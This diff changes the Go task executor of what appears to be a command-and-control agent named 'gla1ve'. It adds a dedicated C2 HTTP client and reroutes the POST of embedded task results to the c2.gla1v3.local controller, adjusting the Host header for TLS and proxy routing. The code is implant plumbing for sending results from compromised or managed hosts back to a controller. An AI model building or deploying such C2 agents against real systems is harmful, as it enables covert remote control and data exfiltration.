@@ -11,8 +11,6 @@ import (
 	"runtime"
 	"strings"
 	"time"
-
-	"gla1ve/agent/pkg/config"
 )
 
 // Task represents a task to execute on the agent
@@ -36,15 +34,17 @@ type TaskResult struct {
 type Executor struct {
 	agentID   string
 	c2URL     string
-	apiClient *http.Client
+	apiClient *http.Client // for API (task results)
+	c2Client  *http.Client // for C2 (beacon + embedded-results)
 }
 
 // NewExecutor creates a new task executor
-func NewExecutor(agentID, c2URL string, apiClient *http.Client) *Executor {
+func NewExecutor(agentID, c2URL string, apiClient, c2Client *http.Client) *Executor {
 	return &Executor{
 		agentID:   agentID,
 		c2URL:     c2URL,
 		apiClient: apiClient,
+		c2Client:  c2Client,
 	}
 }
 
@@ -227,36 +227,51 @@ func (e *Executor) SendEmbeddedResults(results []TaskResult, c2Server string) {
 		return
 	}
 	
-	// Build API URL
-	apiURL := strings.Replace("https://"+c2Server, "c2.gla1v3.local:4443", "api.gla1v3.local", 1)
-	apiURL = strings.Replace(apiURL, "/beacon", "", 1)
-	resultURL := fmt.Sprintf("%s/api/agents/%s/embedded-tasks", apiURL, e.agentID)
-	
+	// Determine correct endpoint depending on host we're talking to.
+	// c2.gla1v3.local (C2) mounts agent routes at root (/beacon, /:agentId/embedded-tasks).
+	var resultURL string
+	if strings.Contains(c2Server, "c2.gla1v3.local") {
+		resultURL = fmt.Sprintf("https://%s/%s/embedded-tasks", c2Server, e.agentID)
+	} else {
+		// Fallback to API host path
+		apiURL := strings.Replace("https://"+c2Server, "c2.gla1v3.local:4443", "api.gla1v3.local", 1)
+		apiURL = strings.Replace(apiURL, "/beacon", "", 1)
+		resultURL = fmt.Sprintf("%s/api/agents/%s/embedded-tasks", apiURL, e.agentID)
+	}
+
 	payload := map[string]interface{}{
 		"results": results,
 	}
-	
+
 	body, _ := json.Marshal(payload)
-	
+
 	log.Printf("Sending %d embedded task results to %s", len(results), resultURL)
-	
+
 	req, _ := http.NewRequest("POST", resultURL, bytes.NewReader(body))
 	req.Header.Set("Content-Type", "application/json")
-
-	// Include tenant API key when available so backend can accept results in environments
-	// where Traefik does not forward the client certificate header.
-	if config.TenantAPIKey != "" {
-		req.Header.Set("x-tenant-api-key", config.TenantAPIKey)
+	// Ensure Host header matches TLS SNI / Traefik routing (strip port if present)
+	if strings.Contains(c2Server, ":") {
+		req.Host = strings.Split(c2Server, ":")[0]
+	} else {
+		req.Host = c2Server
 	}
-	
-	resp, err := e.apiClient.Do(req)
+
+	// Choose correct HTTP client so TLS SNI / routing matches (use C2 client for c2 host)
+	var clientToUse *http.Client
+	if strings.Contains(resultURL, "c2.gla1v3.local") {
+		clientToUse = e.c2Client
+	} else {
+		clientToUse = e.apiClient
+	}
+
+	resp, err := clientToUse.Do(req)
 	if err != nil {
 		log.Printf("Failed to send embedded task results: %v", err)
 		return
 	}
 	defer resp.Body.Close()
-	
-	if resp.StatusCode == 200 {
+
+	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
 		log.Printf("Successfully sent embedded task results")
 	} else {
 		log.Printf("Failed to send embedded task results: %s", resp.Status)
